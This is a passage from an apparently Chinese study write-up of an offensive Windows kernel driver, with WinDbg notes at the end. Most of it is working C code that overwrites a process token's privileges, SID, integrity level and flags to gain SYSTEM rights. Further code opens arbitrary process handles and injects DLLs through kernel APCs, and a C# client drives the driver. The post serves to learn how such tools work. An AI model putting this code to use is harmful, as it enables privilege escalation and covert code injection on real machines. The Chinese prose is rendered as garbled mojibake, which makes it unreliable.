        DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = OnCreateClose;
        DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = OnDeviceControl;

        KdPrint((DRIVER_PREFIX &quot;Driver is loaded successfully.\n&quot;));
    } while (false);

    if (!NT_SUCCESS(ntstatus) &amp;&amp; (pDeviceObject != nullptr))
        ::IoDeleteDevice(pDeviceObject);

    return ntstatus;
}
</code></pre>
<p>æ ¸å¿ƒåŠŸèƒ½å—</p>
<p>ä»£ç åˆ†æ®µ1</p>
<pre><code class="language-C">PEPROCESS pEprocess = nullptr;
auto pid = ::ULongToHandle(*(ULONG*)Irp-&gt;AssociatedIrp.SystemBuffer);
ntstatus = ::PsLookupProcessByProcessId(pid, &amp;pEprocess);
</code></pre>
<p>åˆå§‹åŒ–<code>pEprocess</code>ç»“æ„ä½“ï¼Œå°†è¯·æ±‚çš„è¿›ç¨‹è½¬æ¢ä¸º<code>handle</code>ï¼Œä½¿ç”¨<code>PsLookupProcessByProcessId</code>æŸ¥è¯¢æŒ‡å®š<code>PID</code>çš„<code>pEprocess</code>å­˜åˆ°<code>ntstatus</code></p>
<p><code>_KPROCESS</code>å’Œ<code>_eprocess</code>æ˜¯å­˜å‚¨è¿›ç¨‹ä¿¡æ¯çš„ç»“æ„ä½“ï¼Œåˆ†åˆ«è¡¨ç¤ºå†…æ ¸æ¨¡å¼ä¸‹å’Œç”¨æˆ·æ¨¡å¼ä¸‹çš„è¿›ç¨‹ä¿¡æ¯ã€‚</p>
<p>wwindbgè°ƒè¯•
æŸ¥æ‰¾æŒ‡å®šè¿›ç¨‹çš„<code>_eprocess</code>åœ°å€</p>
<pre><code class="language-C">1: kd&gt; !process 1be0 0
Searching for Process with Cid == 1be0
PROCESS ffff8f0f4d1ab080
    SessionId: 1  Cid: 1be0    Peb: 02768000  ParentCid: 04ac
    DirBase: 496ad000  ObjectTable: ffff9f07935a1a00  HandleCount:  94.
    Image: cmd.exe
</code></pre>
<p>ä»£ç åˆ†æ®µ2</p>
<pre><code class="language-C">PACCESS_TOKEN pPrimaryToken = ::PsReferencePrimaryToken(pEprocess);
//æ ¹æ®eprocessè·å–PrimaryTokenåœ°å€ï¼Œå³_tokenç»“æ„ä½“

auto pSepToken = (PSEP_TOKEN_PRIVILEGES)((ULONG_PTR)pPrimaryToken + g_PrivilegesOffset);
//æ ¹æ®tokenè·å–Privileges

auto nUserAndGroupCount = *(ULONG*)((ULONG_PTR)pPrimaryToken + g_UserAndGroupCountOffset);
//æ ¹æ®tokenè·å–UserAndGroupCount

auto pUserAndGroups = *(PSID_AND_ATTRIBUTES*)((ULONG_PTR)pPrimaryToken + g_UserAndGroupsOffset);
//æ ¹æ®tokenè·å–UserAndGroups

auto nIntegrityLevelIndex = *(ULONG*)((ULONG_PTR)pPrimaryToken + g_IntegrityLevelIndexOffset);`
//æ ¹æ®tokenè·å–IntegrityLevelIndex


//ä¿®æ”¹ä»¤ç‰Œæƒé™
pSepToken-&gt;Present = VALID_PRIVILEGE_MASK;    //PresentæŒ‡ç¤ºå“ªäº›ç‰¹æƒåœ¨ä»¤ç‰Œä¸­å­˜åœ¨
pSepToken-&gt;Enabled = VALID_PRIVILEGE_MASK;    //EnabledæŒ‡ç¤ºå“ªäº›ç‰¹æƒè¢«æ¿€æ´»ï¼Œè¿›ç¨‹å¯è‡ªå®šä¹‰
pSepToken-&gt;EnabledByDefault = VALID_PRIVILEGE_MASK;   //EnabledByDefaultæŒ‡ç¤ºå“ªäº›ç‰¹æƒé»˜è®¤è¢«æ¿€æ´»ï¼Œè¿›ç¨‹æ— éœ€å®šä¹‰å¯ç›´æ¥ä½¿ç”¨

//ä¿®æ”¹`SID`ç»“æ„ä½“çš„`SubAuthority`ç¬¬ä¸€ä¸ªå…ƒç´ ä¸º`0x4000`
auto pSid = (PISID)pUserAndGroups[nIntegrityLevelIndex].Sid;
pSid-&gt;SubAuthority[0] = 0x4000;

KdPrint((DRIVER_PREFIX &quot;Integrity level of PID %u is modified to System level.\n&quot;, HandleToULong(pid)));
</code></pre>
<p>çœ‹<code>token</code>ç»“æ„ä½“ï¼Œæ ¸å¿ƒåŠŸèƒ½ä»£ç åŸºæœ¬éƒ½æ˜¯å¯¹<code>token</code>è¿›è¡Œä¿®æ”¹ä»¥å®ç°<code>SYSTEM</code></p>
<pre><code class="language-C">1: kd&gt; dt _token
nt!_TOKEN
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER
   +0x030 TokenLock        : Ptr64 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES  //g_PrivilegesOffsetçš„å€¼
   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
   +0x078 SessionId        : Uint4B
   +0x07c UserAndGroupCount : Uint4B           //g_UserAndGroupCountOffsetçš„å€¼
   +0x080 RestrictedSidCount : Uint4B
   +0x084 VariableLength   : Uint4B
   +0x088 DynamicCharged   : Uint4B
   +0x08c DynamicAvailable : Uint4B
   +0x090 DefaultOwnerIndex : Uint4B
   +0x098 UserAndGroups    : Ptr64 _SID_AND_ATTRIBUTES  //g_UserAndGroupsOffsetçš„å€¼
   +0x0a0 RestrictedSids   : Ptr64 _SID_AND_ATTRIBUTES
   +0x0a8 PrimaryGroup     : Ptr64 Void
   +0x0b0 DynamicPart      : Ptr64 Uint4B
   +0x0b8 DefaultDacl      : Ptr64 _ACL
   +0x0c0 TokenType        : _TOKEN_TYPE
   +0x0c4 ImpersonationLevel : _SECURITY_IMPERSONATION_LEVEL
   +0x0c8 TokenFlags       : Uint4B             //g_TokenFlagsOffsetçš„å€¼
   +0x0cc TokenInUse       : UChar
   +0x0d0 IntegrityLevelIndex : Uint4B          //g_IntegrityLevelIndexOffsetçš„å€¼
   +0x0d4 MandatoryPolicy  : Uint4B
   +0x0d8 LogonSession     : Ptr64 _SEP_LOGON_SESSION_REFERENCES
   +0x0e0 OriginatingLogonSession : _LUID
   +0x0e8 SidHash          : _SID_AND_ATTRIBUTES_HASH
   +0x1f8 RestrictedSidHash : _SID_AND_ATTRIBUTES_HASH
   +0x308 pSecurityAttributes : Ptr64 _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION
   +0x310 Package          : Ptr64 Void
   +0x318 Capabilities     : Ptr64 _SID_AND_ATTRIBUTES
   +0x320 CapabilityCount  : Uint4B
   +0x328 CapabilitiesHash : _SID_AND_ATTRIBUTES_HASH
   +0x438 LowboxNumberEntry : Ptr64 _SEP_LOWBOX_NUMBER_ENTRY
   +0x440 LowboxHandlesEntry : Ptr64 _SEP_CACHED_HANDLES_ENTRY
   +0x448 pClaimAttributes : Ptr64 _AUTHZBASEP_CLAIM_ATTRIBUTES_COLLECTION
   +0x450 TrustLevelSid    : Ptr64 Void
   +0x458 TrustLinkedToken : Ptr64 _TOKEN
   +0x460 IntegrityLevelSidValue : Ptr64 Void
   +0x468 TokenSidValues   : Ptr64 _SEP_SID_VALUES_BLOCK
   +0x470 IndexEntry       : Ptr64 _SEP_LUID_TO_INDEX_MAP_ENTRY
   +0x478 DiagnosticInfo   : Ptr64 _SEP_TOKEN_DIAG_TRACK_ENTRY
   +0x480 BnoIsolationHandlesEntry : Ptr64 _SEP_CACHED_HANDLES_ENTRY
   +0x488 SessionObject    : Ptr64 Void
   +0x490 VariablePart     : Uint8B
</code></pre>
<p>æŸ¥çœ‹ä¸€ä¸‹è¿›ç¨‹å®é™…çš„å€¼ã€‚
é¦–å…ˆæ‰¾åˆ°tokenç»“æ„ä½“åœ°å€</p>
<pre><code class="language-C">1: kd&gt; !process 1be0 3
</code></pre>
<p><img alt="" src="../../images/Snipaste_2023-12-18_16-05-43.jpg" /></p>
<p>åœ¨<code>0x40</code>åç§»é‡å¤„æ‰¾åˆ°äº†<code>pPrimaryToken + g_PrivilegesOffset</code>çš„å€¼
å¥—åˆ°<code>_SEP_TOKEN_PRIVILEGES</code>ç»“æ„ä½“æ›´åŠ ç›´è§‚çš„å±•ç¤º</p>
<p>å’Œä»£ç ä¸­å®šä¹‰çš„å€¼æ˜¯ä¸€æ ·çš„</p>
<pre><code class="language-C">#define VALID_PRIVILEGE_MASK 0x0000001FFFFFFFFCULL
</code></pre>
<p><img alt="" src="../../images/Snipaste_2023-12-18_16-09-20.jpg" /></p>
<p>åœ¨<code>0x7c</code>åç§»é‡æ‰¾åˆ°<code>pPrimaryToken + g_UserAndGroupCountOffset</code>çš„å€¼
<img alt="" src="../../images/Snipaste_2023-12-18_17-04-59.jpg" /></p>
<p>åœ¨<code>0x98</code>åç§»é‡æ‰¾åˆ°<code>pPrimaryToken + g_UserAndGroupsOffset</code>çš„å€¼
ä»£ç å·²ç»ä¿®æ”¹äº†<code>SID</code>çš„<code>SubAuthority</code>çš„å€¼ã€‚åªèƒ½æ˜¾ç¤ºæ•´ä¸ª<code>SID</code>
<img alt="" src="../../images/Snipaste_2023-12-18_17-06-17.jpg" /></p>
<p>åœ¨<code>0xd0</code>åç§»é‡æ‰¾åˆ°<code>pPrimaryToken + g_IntegrityLevelIndexOffset</code>çš„å€¼
<img alt="" src="../../images/Snipaste_2023-12-18_17-08-37.jpg" /></p>
<p>ä»£ç åˆ†æ®µ3
æ­¤å¤„å¾ªç¯ä¿®æ”¹<code>IdentifierAuthority</code>ï¼Œå°†<code>sid</code>ä¿®æ”¹ä¸º<code>system</code>ç”¨æˆ·çš„</p>
<pre><code class="language-C">            for (auto idx = 0u; idx &lt; nUserAndGroupCount; idx++)
            {
                // Overwrite token user to &quot;NT AUTHORITY\SYSTEM&quot;
                if (pUserAndGroups[idx].Attributes == 0)
                {
                    pSid = (PISID)pUserAndGroups[idx].Sid;

                    for (auto offset = 1; offset &lt; pSid-&gt;SubAuthorityCount; offset++)
                        pSid-&gt;SubAuthority[offset] = 0;

                    pSid-&gt;SubAuthorityCount = 1;
                    pSid-&gt;IdentifierAuthority.Value[0] = 0;
                    pSid-&gt;IdentifierAuthority.Value[1] = 0;
                    pSid-&gt;IdentifierAuthority.Value[2] = 0;
                    pSid-&gt;IdentifierAuthority.Value[3] = 0;
                    pSid-&gt;IdentifierAuthority.Value[4] = 0;
                    pSid-&gt;IdentifierAuthority.Value[5] = 5;
                    pSid-&gt;SubAuthority[0] = 18;

                    KdPrint((DRIVER_PREFIX &quot;Token user of PID %u is modified to \&quot;NT AUTHORITY\\SYSTEM\&quot;.\n&quot;, HandleToULong(pid)));
                    break;
                }
            }
</code></pre>
<p>ä»£ç åˆ†æ®µ4
ä¿®æ”¹<code>pPrimaryToken + g_TokenFlagsOffset</code>ï¼Œä¿®æ”¹<code>TokenFlags</code>ä¸º<code>system</code>çš„</p>
<pre><code class="language-C">*(ULONG*)((ULONG_PTR)pPrimaryToken + g_TokenFlagsOffset) = 0x00002800u;

::PsDereferencePrimaryToken(pPrimaryToken);
ObDereferenceObject(pEprocess);
</code></pre>
<p>åœ¨<code>0xc8</code>åç§»é‡æ‰¾åˆ°<code>pPrimaryToken + g_TokenFlagsOffset</code>çš„å€¼
<img alt="" src="../../images/Snipaste_2023-12-18_17-13-20.jpg" />
è¿™æ—¶è¿›ç¨‹å·²ç»æ˜¯<code>system</code>äº†ã€‚</p>
<p>æ€»ä½“æ¥è¯´ï¼Œå®ç°åŸç†æ˜¯å…ˆè·å–è¿›ç¨‹çš„<code>eprocess</code>ï¼Œå†æ ¹æ®<code>eprocess</code>è·å–<code>_token</code>ç»“æ„ä½“åœ°å€ï¼Œä¿®æ”¹<code>_token</code>ä¸­çš„<code>Privileges</code>ã€<code>TokenFlags</code>ã€<code>UserAndGroups</code>å®ç°æœ€é«˜æƒé™ã€‚</p>
<p><code>exe</code>çš„è°ƒç”¨é€»è¾‘æ˜¯è·å–è‡ªèº«è¿›ç¨‹çš„ä¿¡æ¯ï¼Œè°ƒç”¨é©±åŠ¨ä¿®æ”¹è‡ªèº«è¿›ç¨‹çš„æƒé™ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªå½“å‰æƒé™çš„æ–°ç¨‹åºã€‚
åœ¨windbgä¸­å¯ä»¥è¯å®è¿™ä¸€ç‚¹ã€‚
<img alt="" src="../../images/Snipaste_2023-12-18_17-43-48.jpg" />
<img alt="" src="../../images/Snipaste_2023-12-18_17-44-15.jpg" />
<img alt="" src="../../images/Snipaste_2023-12-18_17-45-57.jpg" /></p>
<p>ç¨å¾®æ”¹ä¸‹ï¼Œæå‡åˆ«çš„è¿›ç¨‹æƒé™
<img alt="" src="../../images/Snipaste_2023-12-18_17-50-08.jpg" /></p>
<h4 id="getprochandle">GetProcHandle</h4>
<p>è¿™ä¸ªåŠŸèƒ½æ˜¯è·å–è¿›ç¨‹å¥æŸ„ï¼Œç”±äºæ˜¯å†…æ ¸çº§åˆ«ï¼Œæ‰€ä»¥å¯ä»¥è·å–ä»»æ„è¿›ç¨‹å¥æŸ„ã€‚
ä»£ç æ˜¯ç›´æ¥ä½¿ç”¨<code>ZwOpenProcess</code>æ‰“å¼€è¿›ç¨‹è·å–å¥æŸ„äº†</p>
<pre><code class="language-C">        ntstatus = ::ZwOpenProcess(
            &amp;hProcess,
            PROCESS_ALL_ACCESS,
            &amp;objectAttributes,
            &amp;clientId);

        if (!NT_SUCCESS(ntstatus))
        {
            *(HANDLE*)Irp-&gt;AssociatedIrp.SystemBuffer = nullptr;
            KdPrint((DRIVER_PREFIX &quot;Failed to ZwOpenProcess() (NTSTATUS = 0x%08X).\n&quot;, ntstatus));
            break;
        }

        *(HANDLE*)Irp-&gt;AssociatedIrp.SystemBuffer = hProcess;
        info = sizeof(HANDLE);
        KdPrint((DRIVER_PREFIX &quot;ZwOpenProcess() is successful.\n&quot;));
    }

    Irp-&gt;IoStatus.Status = ntstatus;
    Irp-&gt;IoStatus.Information = info;
    IoCompleteRequest(Irp, 0);

    return ntstatus;
</code></pre>
<h4 id="injectlibrary">InjectLibrary</h4>
<p>å‘è¿›ç¨‹æ³¨å…¥dll</p>
<p><img alt="" src="../../images/Snipaste_2024-01-08_14-04-53.jpg" /></p>
<p>ä»<code>OnDeviceControl</code>å‡½æ•°çš„æ•´ä¸ªæµç¨‹æ¥çœ‹ï¼Œsysé©±åŠ¨çš„è¯¦ç»†å·¥ä½œæ˜¯åœ¨systemæƒé™ä¸‹å°†dllç¬¦åŠ åˆ°äº†å½“å‰è¿›ç¨‹ï¼Œç„¶åæ ¹æ®é©±åŠ¨è°ƒç”¨ç¨‹åºæŒ‡å®šçš„ç›®æ ‡è¿›ç¨‹ï¼Œå°†dllå¤åˆ¶åˆ°äº†ç›®æ ‡è¿›ç¨‹çš„å†…å­˜ç©ºé—´ï¼Œä½¿ç”¨å†…æ ¸æ¨¡å¼ä¸‹çš„APCå°†dllåŠ å…¥äº†APCé˜Ÿåˆ—å¹¶è°ƒç”¨ã€‚</p>
<pre><code class="language-C">        //ä¸ºå†…æ ¸æ¨¡å¼çš„APCåˆ†é…å†…å­˜ç©ºé—´
        pKapc = (PKAPC)::ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), (ULONG)DRIVER_TAG);

        if (pKapc == nullptr)
        {
            KdPrint((DRIVER_PREFIX &quot;Failed to allocate non-paged pool for _KAPC.\n&quot;));
            break;
        }
        else
        {
            KdPrint((DRIVER_PREFIX &quot;Non-paged pool for _KAPC is allocated at 0x%p.\n&quot;, pKapc));
        }

        //è‡ªå®šä¹‰å‡½æ•°GetLdrLoadDllAddress()ï¼Œä»ntdllä¸­è·å–LdrLoadDll()å‡½æ•°åœ°å€ï¼ŒLdrLoadDllç”¨äºåŠ è½½dll
        if (LdrLoadDll == nullptr)
            LdrLoadDll = (PLdrLoadDll)GetLdrLoadDllAddress();

        if (LdrLoadDll == nullptr)
        {
            KdPrint((DRIVER_PREFIX &quot;Failed to get LdrLoadDll() address.\n&quot;));
            break;
        }
        else
        {
            KdPrint((DRIVER_PREFIX &quot;LdrLoadDll() is at 0x%p.\n&quot;, (PVOID)LdrLoadDll));
        }

        //é€šè¿‡çº¿ç¨‹IDæŸ¥æ‰¾çº¿ç¨‹ï¼Œè¿”å›å¥æŸ„
        ntstatus = ::PsLookupThreadByThreadId(ULongToHandle(pContext-&gt;ThreadId), &amp;pThread);

        if (!NT_SUCCESS(ntstatus))
        {
            pThread = nullptr;
            KdPrint((DRIVER_PREFIX &quot;Failed to lookup nt!_ETHREAD for thread ID %u (NTSTATUS = 0x%08X).\n&quot;,
                pContext-&gt;ThreadId,
                ntstatus));
            break;
        }
        else
        {
            KdPrint((DRIVER_PREFIX &quot;nt!_ETHREAD for thread ID %u is at 0x%p.\n&quot;, pContext-&gt;ThreadId, pThread));
        }

        //é€šè¿‡çº¿ç¨‹å¥æŸ„è·å–è¿›ç¨‹id
        clientId.UniqueProcess = ::PsGetThreadProcessId(pThread);

        //æ¥ç€æ‰“å¼€è¿›ç¨‹ï¼Œè·å–è¿›ç¨‹å¥æŸ„
        ntstatus = ::ZwOpenProcess(
            &amp;hProcess,
            PROCESS_ALL_ACCESS,
            &amp;objectAttributes,
            &amp;clientId);

        if (!NT_SUCCESS(ntstatus))
        {
            hProcess = nullptr;
            KdPrint((DRIVER_PREFIX &quot;Failed to lookup get process handle of thread (NTSTATUS = 0x%08X).\n&quot;, ntstatus));
            break;
        }
        else
        {
            KdPrint((DRIVER_PREFIX &quot;Got process handle for PID %u.\n&quot;, HandleToULong(clientId.UniqueProcess)));
        }

        //åœ¨è¿›ç¨‹ä¸­åˆ†é…å†…å­˜ç©ºé—´
        ntstatus = ::ZwAllocateVirtualMemory(
            hProcess,
            &amp;pPathBuffer,
            NULL,
            &amp;nBufferSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE);

        if (!NT_SUCCESS(ntstatus))
        {
            pPathBuffer = nullptr;
            KdPrint((DRIVER_PREFIX &quot;Failed to allocate buffer in PID %u (NTSTATUS = 0x%08X).\n&quot;,
                HandleToULong(clientId.UniqueProcess),
                ntstatus));
            break;
        }
        else
        {

            //ä½¿ç”¨å½“å‰çº¿ç¨‹åŠ è½½dllï¼Œç„¶åå°†å½“å‰çº¿ç¨‹é™„åŠ åˆ°ç›®æ ‡è¿›ç¨‹ä¸­ï¼Œå°†dllå¤åˆ¶åˆ°ç›®æ ‡è¿›ç¨‹æ‰€åˆ†é…çš„å†…å­˜ç©ºé—´
            KdPrint((DRIVER_PREFIX &quot;%u bytes buffer is allocate at 0x%p in PID %u.\n&quot;,
                HandleToULong((HANDLE)nBufferSize),
                pPathBuffer,
                HandleToULong(clientId.UniqueProcess)));

            // Write DLL path (_UNICODE_STRING) in the target thread memory.
            ::KeStackAttachProcess(::PsGetThreadProcess(pThread), &amp;apcState);

            auto pLibraryPath = (PUNICODE_STRING)pPathBuffer;
            pLibraryPath-&gt;MaximumLength = (USHORT)(sizeof(WCHAR) * 256);
            pLibraryPath-&gt;Buffer = (PWCH)((ULONG_PTR)pPathBuffer + sizeof(UNICODE_STRING));
            ::memcpy(pLibraryPath-&gt;Buffer, &amp;pContext-&gt;LibraryPath, sizeof(WCHAR) * 256);
            ((WCHAR*)pLibraryPath-&gt;Buffer)[256] = NULL; // ensure null-terminator for wcslen()
            pLibraryPath-&gt;Length = (USHORT)(sizeof(WCHAR) * ::wcslen(pLibraryPath-&gt;Buffer));

            KdPrint((DRIVER_PREFIX &quot;Library to inject: %wZ.\n&quot;, pPathBuffer));

            ::KeUnstackDetachProcess(&amp;apcState);
        }

        //åˆå§‹åŒ–APCå¯¹è±¡
        KeInitializeApc(
            pKapc,
            pThread,
            OriginalApcEnvironment,
            ApcRoutine,
            nullptr,
            (PKNORMAL_ROUTINE)LdrLoadDll,
            UserMode,
            nullptr);

        //å°†è¿›ç¨‹ä¸­çš„å†…å­˜ç©ºé—´æ’å…¥APC
        if (KeInsertQueueApc(pKapc, nullptr, pPathBuffer, IO_NO_INCREMENT))
        {
            KdPrint((DRIVER_PREFIX &quot;APC queue is inserted successfully.\n&quot;));
            KeAlertThread(pThread, UserMode);
        }
        else
        {
            KdPrint((DRIVER_PREFIX &quot;Failed to insert APC queue.\n&quot;));
        }
    }

    //è‡³æ­¤dllå·²ç»åŠ è½½å®Œæˆï¼Œåé¢æ˜¯é‡Šæ”¾ç©ºé—´çš„ä»£ç 
    if (!NT_SUCCESS(ntstatus) &amp;&amp; (pKapc != nullptr))
        ::ExFreePoolWithTag(pKapc, (ULONG)DRIVER_TAG);

    if (hProcess != nullptr)
    {
        if (!NT_SUCCESS(ntstatus) &amp;&amp; (pPathBuffer != nullptr))
            ::ZwFreeVirtualMemory(hProcess, &amp;pPathBuffer, &amp;nBufferSize, MEM_RELEASE);

        ::ZwClose(hProcess);
    }

    if (pThread != nullptr)
        ObDereferenceObject(pThread);

    Irp-&gt;IoStatus.Status = ntstatus;
    Irp-&gt;IoStatus.Information = info;
    IoCompleteRequest(Irp, 0);

    return ntstatus;
</code></pre>
<p>åœ¨C#çš„è°ƒç”¨ç¨‹åºä¸­ï¼Œè¦ä¹ˆæŒ‡å®šç°æœ‰è¿›ç¨‹çš„tidï¼Œè¦ä¹ˆæŒ‡å®šå¼€å¯ä¸€ä¸ªæ–°è¿›ç¨‹</p>
<pre><code class="language-c">                    if (threadId &gt; 0)
                        Modules.InjectDll(threadId, options.GetValue(&quot;library&quot;));
                }
                else
                {
                    Modules.InjectDllWithCommand(options.GetValue(&quot;command&quot;), options.GetValue(&quot;library&quot;));
                }
</code></pre>
<p>è‡ªå®šä¹‰çš„ç»“æ„ä½“<code>INJECT_CONTEXT</code>å­˜å‚¨ä¼ å…¥çš„å‚æ•°</p>
<pre><code class="language-C">        public INJECT_CONTEXT(int threadId, string libraryPath)
        {
            ThreadId = (uint)threadId;
            LibraryPath = new byte[512];

            if (!string.IsNullOrEmpty(libraryPath))
            {
                var pathBytes = Encoding.Unicode.GetBytes(libraryPath);
                var nCopyLength = (pathBytes.Length &lt; 512) ? pathBytes.Length : 512;
                Buffer.BlockCopy(pathBytes, 0, LibraryPath, 0, nCopyLength);
            }
        }
</code></pre>
<p>ä½¿ç”¨<code>StructureToPtr</code>å°†ç»“æ„ä½“è½¬æ¢ä¸ºæŒ‡é’ˆï¼Œè°ƒç”¨<code>NtDeviceIoControlFile</code>å‡½æ•°ï¼Œå®Œæˆé©±åŠ¨é€šä¿¡</p>
<pre><code class="language-C">       public static bool InjectDll(int threadId, string dllPath)
       {
           NTSTATUS ntstatus;
           IntPtr pInBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(INJECT_CONTEXT)));
           var context = new INJECT_CONTEXT(threadId, Path.GetFullPath(dllPath));

           Console.WriteLine(&quot;[*] Injection target information:&quot;);
           Console.WriteLine(&quot;    [*] Thread ID    : {0}&quot;, context.ThreadId);
           Console.WriteLine(&quot;    [*] Library Path : {0}&quot;, Encoding.Unicode.GetString(context.LibraryPath).TrimEnd('\0'));

           Marshal.StructureToPtr(context, pInBuffer, true);

           Console.WriteLine(&quot;[&gt;] Sending a query to {0}.&quot;, Globals.SYMLINK_PATH);

           do
           {
               IntPtr hDevice;

               using (var objectAttributes = new OBJECT_ATTRIBUTES(
                   Globals.SYMLINK_PATH,
                   OBJECT_ATTRIBUTES_FLAGS.OBJ_CASE_INSENSITIVE))
               {
                   ntstatus = NativeMethods.NtCreateFile(
                       out hDevice,
                       ACCESS_MASK.GENERIC_READ | ACCESS_MASK.GENERIC_WRITE,
                       in objectAttributes,
                       out IO_STATUS_BLOCK _,
                       IntPtr.Zero,
                       FILE_ATTRIBUTE_FLAGS.NORMAL,
                       FILE_SHARE_ACCESS.NONE,
                       FILE_CREATE_DISPOSITION.OPEN,
                       FILE_CREATE_OPTIONS.NON_DIRECTORY_FILE,
                       IntPtr.Zero,
                       0u);
               }

               if (ntstatus != Win32Consts.STATUS_SUCCESS)
               {
                   Console.WriteLine(&quot;[-] Failed to open {0} (NTSTATUS = 0x{1}).&quot;, Globals.SYMLINK_PATH, ntstatus.ToString(&quot;X8&quot;));
                   break;
               }
               else
               {
                   Console.WriteLine(&quot;[+] Got a handle to {0} (Handle = 0x{1})&quot;, Globals.SYMLINK_PATH, hDevice.ToString(&quot;X&quot;));
               }

               ntstatus = NativeMethods.NtDeviceIoControlFile(
                   hDevice,
                   IntPtr.Zero,
                   IntPtr.Zero,
                   IntPtr.Zero,
                   out IO_STATUS_BLOCK _,
                   Globals.IOCTL_INJECT_LIBRARY,
                   pInBuffer,
                   (uint)Marshal.SizeOf(typeof(INJECT_CONTEXT)),
                   IntPtr.Zero,
                   0u);
               NativeMethods.NtClose(hDevice);

               if (ntstatus != Win32Consts.STATUS_SUCCESS)
                   Console.WriteLine(&quot;[-] Failed to NtDeviceIoControlFile() (NTSTATUS = 0x{0}).&quot;, ntstatus.ToString(&quot;X8&quot;));
               else
                   Console.WriteLine(&quot;[+] DLL injection would be successful.&quot;);
           } while (false);

           Marshal.FreeHGlobal(pInBuffer);

           Console.WriteLine(&quot;[*] Done.&quot;);

           return (ntstatus == Win32Consts.STATUS_SUCCESS);
</code></pre>
<p>ä¸ºä»€ä¹ˆåœ¨é©±åŠ¨ä¸­å®šä¹‰çš„<code>IOCTL</code>ç¼–å·å’Œé©±åŠ¨è°ƒç”¨çš„ä¸ä¸€æ ·ï¼Ÿ</p>
<p>sysæ–‡ä»¶ä¸­çš„
<code>#define IOCTL_INJECT_LIBRARY CTL_CODE(0x8000, 0x0600, METHOD_BUFFERED, FILE_ANY_ACCESS)</code></p>
<p>c#è°ƒç”¨çš„
<code>public static uint IOCTL_INJECT_LIBRARY { get; } = 0x80001800u;</code></p>
<p>è¿™æ˜¯å› ä¸ºåœ¨cä¸­ä½¿ç”¨äº†<code>CTL_CODE</code>å®æ¥å®šä¹‰<code>IOCTL</code>ã€‚</p>
<p><code>IOCTL</code>æ˜¯ä¸€ä¸ª32ä½çš„å€¼ï¼Œç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œåˆ†æ“ä½œä»£ç å’Œå‚æ•°ã€‚
cé‡Œé¢ä½¿ç”¨äº†å®<code>CTL_CODE</code>æ¥åˆ†åˆ«æŒ‡å®šä¸åŒçš„éƒ¨åˆ†ï¼Œè€Œc#æ²¡æœ‰å®å¯ä»¥ä½¿ç”¨ï¼Œæ‰€ä»¥æŒ‡å®šæŒ‡å®šå•ä¸ªå€¼<code>0x80001800u</code></p>
<pre><code class="language-C">#define CTL_CODE( DeviceType, Function, Method, Access ) (                 \
    ((DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method) \
)
</code></pre>
<h4 id="modhide">ModHide</h4>
<h4 id="prochide">ProcHide</h4>
<h4 id="procprotect">ProcProtect</h4>
<h4 id="querymodule">QueryModule</h4>
<h4 id="stealtoken">StealToken</h4>
<h2 id="windbg">Windbg</h2>
<p>https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debuggercmds/commands</p>
<p>https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/standard-debugging-techniques</p>
<h3 id="_45">å¸¸ç”¨å‘½ä»¤</h3>
<ul>
<li>.process æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯</li>
</ul>
<pre><code>.process 0 0 cmd.exe    æŸ¥æ‰¾è¿›ç¨‹
</code></pre>
<ul>
<li>dt æŸ¥çœ‹ç»“æ„ä½“</li>
</ul>
<pre><code>dt xxxx   æŸ¥çœ‹å½“å‰ç»“æ„ä½“
dt xxx!xxx  æŸ¥çœ‹æŒ‡å®šæ¨¡å—çš„ç»“æ„ä½“
dt _peb @$peb å°†å€¼åº”ç”¨åˆ°ç»“æ„ä½“
</code></pre>
<ul>
<li>lm æŸ¥çœ‹æ¨¡å—</li>
</ul>
<pre><code class="language-c">0:009&gt; lm
start             end                 module name
00007ff6`f33c0000 00007ff6`f34da000   Notepad  C (no symbols)           
00007ffb`9a5c0000 00007ffb`9a77c000   DUI70      (deferred)             
00007ffb`b9350000 00007ffb`b9933000   Microsoft_UI_Xaml   (deferred)             
00007ffb`c0b40000 00007ffb`c0e78000   riched20   (deferred)             
00007ffb`c3550000 00007ffb`c3578000   edputil    (deferred)         
</code></pre>
<ul>
<li>~ æŸ¥çœ‹çº¿ç¨‹</li>
</ul>
<pre><code class="language-C">0:009&gt; ~
   0  Id: f90.400c cSuspend: 1 Teb: 00000041`0f6b4000 Unfrozen
   1  Id: f90.15ec Suspend: 1 Teb: 00000041`0f6b6000 Unfrozen
   2  Id: f90.4a18 Suspend: 1 Teb: 00000041`0f6b8000 Unfrozen
   3  Id: f90.3ea4 Suspend: 1 Teb: 00000041`0f6ba000 Unfrozen
   4  Id: f90.3840 Suspend: 1 Teb: 00000041`0f6bc000 Unfrozen
   5  Id: f90.1a50 Suspend: 1 Teb: 00000041`0f6be000 Unfrozen
   6  Id: f90.4514 Suspend: 1 Teb: 00000041`0f6c0000 Unfrozen
   7  Id: f90.3d30 Suspend: 1 Teb: 00000041`0f6c2000 Unfrozen

</code></pre>
<ul>
<li>k æŸ¥çœ‹æ ˆ</li>
</ul>
<pre><code class="language-c">0:009&gt; k
 # Child-SP          RetAddr               Call Site
00 00000041`100fc558 00007ffc`02a55370     ntdll!NtCreateFile
01 00000041`100fc560 00007ffc`02a54cdc     KERNELBASE!CreateFileInternal+0x590
02 00000041`100fc6d0 00007ffc`02a5488c     KERNELBASE!CreateFileW+0x7c
03 00000041`100fc750 00007ffc`02a563c0     KERNELBASE!BasepLoadLibraryAsDataFileInternal+0x4dc
04 00000041`100fc980 00007ffc`04707ddc     KERNELBASE!LoadLibraryExW+0xe0
